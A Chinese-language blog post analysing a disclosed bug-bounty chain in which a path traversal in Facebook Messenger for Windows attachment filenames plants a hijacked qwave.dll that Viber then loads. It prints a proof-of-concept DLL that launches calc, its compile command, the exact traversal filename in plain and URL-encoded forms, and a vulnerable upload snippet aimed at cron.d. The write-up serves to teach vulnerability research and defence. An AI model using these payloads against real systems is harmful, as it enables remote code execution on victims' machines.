#  路径遍历+DLL劫持：Meta的11万美元漏洞链复盘  
原创 Zacarx
                    Zacarx  Zacarx随笔   2026-02-05 01:00  
  
## 案例背景  
  
2024年6月，Meta举办了BountyCon黑客大赛。一位安全研究员在Facebook Messenger Windows客户端中发现了一个路径遍历漏洞，并通过巧妙的漏洞链组合，将其升级为远程代码执行（RCE）。  
  
这个漏洞最终获得了$111,750的赏金，并帮助研究员拿下了比赛第一名。  
  
**关键信息：**  
- 目标：Facebook Messenger for Windows  
  
- 漏洞类型：路径遍历 + DLL劫持  
  
- 赏金：$111,750（约80万人民币）  
  
- 披露时间：2024年6月  
  
这个案例的精彩之处在于：一个看似"鸡肋"的路径遍历漏洞，在Windows路径长度限制的约束下，研究员通过创造性思维，最终实现了零点击RCE。  
## 背景知识  
### 什么是路径遍历？  
  
路径遍历，也叫目录穿越，是一种通过操纵文件路径来访问预期目录之外文件的攻击技术。  
  
**核心原理：**  
 利用 ../  
（Linux）或 ..\  
（Windows）这样的相对路径符号，跳出程序限定的目录范围。  
  
举个生活中的例子：  
- 正常情况：你只能进入自己的房间（/home/你的房间/  
）  
  
- 路径遍历：通过"往回走"（../  
），你可以进入隔壁房间甚至整栋楼  
  
**代码层面的问题：**  
```
# 危险代码示例def save_file(filename, content):    # 直接拼接用户输入的文件名，没有过滤    path = "/var/uploads/" + filename    with open(path, 'wb') as f:        f.write(content)# 攻击者输入: filename = "../../../etc/cron.d/backdoor"# 实际写入: /var/uploads/../../../etc/cron.d/backdoor# 等价于: /etc/cron.d/backdoor  （系统定时任务目录！）
```  
### 什么是DLL劫持（DLL Hijacking）？  
  
DLL（Dynamic-Link Library，动态链接库）是Windows系统中程序共享代码的一种机制。当程序启动时，会按照特定顺序搜索并加载所需的DLL文件。  
  
**Windows的DLL搜索顺序：**  
1. 程序所在目录  
  
1. 系统目录（C:\Windows\System32）  
  
1. 16位系统目录（C:\Windows\System）  
  
1. Windows目录（C:\Windows）  
  
1. 当前工作目录  
  
1. PATH环境变量中的目录  
  
**DLL劫持的原理：**  
 如果攻击者能在搜索顺序靠前的位置放置一个同名的恶意DLL，程序就会优先加载恶意DLL，从而执行攻击者的代码。  
```
正常情况：程序A启动 → 搜索qwave.dll → 在System32找到 → 加载正常DLLDLL劫持：攻击者在程序目录放置恶意qwave.dll程序A启动 → 搜索qwave.dll → 在程序目录先找到 → 加载恶意DLL → 执行恶意代码
```  
### 什么是端到端加密（E2EE）？  
  
E2EE（End-to-End Encryption，端到端加密）是一种通信加密方式，只有通信双方能解密消息内容，中间的服务器无法查看。  
  
**安全隐患：**  
 由于服务器无法检查加密内容，所有的安全验证都必须在客户端完成。如果客户端验证不严格，攻击者可以通过加密通道发送恶意数据。  
## 漏洞发现过程  
### Step 1：选择攻击面  
  
研究员的思路很清晰：E2EE聊天功能是一个值得关注的攻击面。  
  
**原因分析：**  
- 服务器无法检查加密内容，安全责任全在客户端  
  
- 文件传输功能涉及文件名处理，容易出问题  
  
- Windows客户端的文件系统操作往往比Web端更危险  
  
### Step 2：测试路径遍历  
  
研究员尝试发送一个带有路径遍历序列的文件名：  
```
原始文件名: test.bat恶意文件名: ..\test.batURL编码后: %2e%2e%5ctest.bat
```  
  
**测试结果：**  
 Messenger客户端没有过滤文件名中的 ../  
 序列，文件被保存到了预期目录之外！  
  
正常情况下，附件应该保存在：  
```
C:\Users\用户名\AppData\Local\Messenger\TamStorage\media_bank\AdvancedCrypto\[用户ID]\persistent\[UUID]\2024\06\03\[时间戳].att.[UUID]\
```  
  
使用 ..\test.bat  
 后，文件被保存到了上一级目录。  
  
**漏洞确认！**  
 但问题来了...  
### Step 3：遇到Windows路径长度限制  
  
Windows有一个著名的限制：**MAX_PATH = 260字符**  
。  
  
Messenger的附件存储路径本身就很长：  
```
C:\Users\vulna\AppData\Local\Messenger\TamStorage\media_bank\AdvancedCrypto\100027775233281\persistent\da7a85eb-aac7-46da-9cba-7a2f38f88e08\2024\06\03\20240603T091559605.att.04484a15-4cbf-4a1d-9e65-a48c59dcc7a2\
```  
  
这个路径已经占用了**212个字符**  
！  
  
**剩余空间计算：**  
- 总限制：260字符  
  
- 已占用：212字符  
  
- 剩余：48字符  
  
每个 ..\  
 占用3个字符。要跳出这个深层目录，需要向上遍历11层：  
```
..\..\..\..\..\..\..\..\..\..\..\  = 33字符
```  
  
**最终只剩15个字符**  
 用于目标路径和文件名！  
  
这看起来几乎是个死局——15个字符能做什么？  
### Step 4：寻找DLL劫持目标  
  
研究员没有放弃，开始思考：在 C:\Users\用户名\AppData\Local\  
 目录下，有哪些应用程序存在DLL劫持漏洞？  
  
**关键发现：**  
 Viber（一款流行的即时通讯软件）在启动时会尝试加载 qwave.dll  
，而这个DLL默认不存在于Viber的安装目录。  
  
Viber的安装路径：  
```
C:\Users\用户名\AppData\Local\Viber\
```  
  
从Messenger的附件目录到Viber目录的相对路径：  
```
..\Viber\qwave.dll
```  
  
**字符数计算：**  
- ..\Viber\qwave.dll  
 = 19字符  
  
等等，之前说只剩15个字符，19个字符怎么够？  
  
研究员重新计算了遍历层数，发现可以少遍历几层，刚好让总路径长度控制在260字符以内。  
## 完整利用过程  
### 攻击链概览  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ASeY5n9R7uWL6ULI0Fvn4ynsOO8Ja24KMkaMSniaaicKCAKN4mibxicfeh0icCIq91j6aUyeysrmfibrSBA/640?wx_fmt=png&from=appmsg "")  
  
  
### Step 1：制作恶意DLL  
  
创建一个简单的DLL，在被加载时执行计算器（PoC演示用）：  
```
// qwave.c - 恶意DLL示例#include <windows.h>// DLL入口点，当DLL被加载时自动执行BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {    if (fdwReason == DLL_PROCESS_ATTACH) {        // DLL被加载时执行        // PoC: 弹出计算器证明代码执行        WinExec("calc.exe", SW_SHOW);                // 实际攻击中可以：        // - 下载并执行远程payload        // - 建立反向Shell        // - 窃取凭据        // - 安装持久化后门    }    return TRUE;}
```  
  
编译命令：  
```
# 使用MinGW编译x86_64-w64-mingw32-gcc -shared -o qwave.dll qwave.c
```  
### Step 2：构造恶意文件名  
  
将DLL文件重命名为包含路径遍历序列的文件名：  
```
原始文件名: qwave.dll路径遍历payload（需要向上遍历到AppData\Local\）:..\..\..\..\..\..\..\..\..\..\..\Viber\qwave.dllURL编码后（用于绕过某些过滤）:%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cViber%5cqwave.dll
```  
  
**编码说明：**  
- %2e  
 = .  
（点号）  
  
- %5c  
 = \  
（反斜杠）  
  
- 所以 %2e%2e%5c  
 = ..\  
  
### Step 3：发送恶意文件  
  
通过Messenger的端到端加密聊天功能，将这个"文件"发送给目标用户。  
  
由于是E2EE通道，Meta的服务器无法检查文件内容和文件名，恶意payload直接到达受害者的客户端。  
### Step 4：等待触发  
  
当受害者：  
1. 打开Messenger，文件自动下载  
  
1. 恶意DLL被写入 C:\Users\xxx\AppData\Local\Viber\qwave.dll  
  
1. 受害者日常启动Viber  
  
1. Viber加载恶意DLL  
  
1. **攻击者代码执行！**  
  
**注意：**  
 整个过程中，受害者只需要正常使用Messenger接收消息，然后在某个时间点启动Viber即可。不需要点击任何可疑链接或文件。  
## 漏洞影响  
### 危害等级：严重（Critical）  
  
**攻击条件：**  
- 攻击者只需知道受害者的Messenger账号  
  
- 受害者电脑上安装了Viber（或其他存在DLL劫持漏洞的应用）  
  
- 无需受害者点击任何东西  
  
**攻击者可以：**  
- 完全控制受害者电脑  
  
- 窃取所有文件和凭据  
  
- 安装键盘记录器  
  
- 加入僵尸网络  
  
- 进行勒索软件攻击  
  
### 影响范围  
- Facebook Messenger Windows客户端的所有用户  
  
- 潜在影响数亿用户  
  
- 结合其他DLL劫持漏洞，攻击面更广  
  
## 案例启示  
### 1. "鸡肋"漏洞的价值  
  
这个案例完美诠释了"漏洞链"的威力：  
- 单独的路径遍历：受限于260字符限制，几乎无法利用  
  
- 单独的DLL劫持：需要其他方式将文件放到目标位置  
  
- **两者结合：零点击RCE，价值11万美元**  
  
**启示：**  
 不要轻易放弃看似"鸡肋"的漏洞，思考它能否与其他漏洞组合。  
### 2. 深入理解目标环境  
  
研究员成功的关键在于：  
- 了解Windows的路径长度限制  
  
- 了解DLL搜索顺序机制  
  
- 了解目标用户可能安装的其他软件  
  
**启示：**  
 漏洞挖掘不只是找Bug，更是理解整个系统的运作方式。  
### 3. E2EE不是万能的  
  
端到端加密保护了通信内容不被窃听，但：  
- 不能保护客户端免受恶意输入  
  
- 反而可能让服务端的安全检查失效  
  
- 客户端安全变得更加重要  
  
### 4. 类似漏洞可能出现的场景  
- 任何处理用户上传文件名的功能  
  
- 即时通讯软件的文件传输  
  
- 邮件客户端的附件处理  
  
- 云存储的文件同步功能  
  
- 任何涉及文件路径拼接的代码  
  
  
  
  
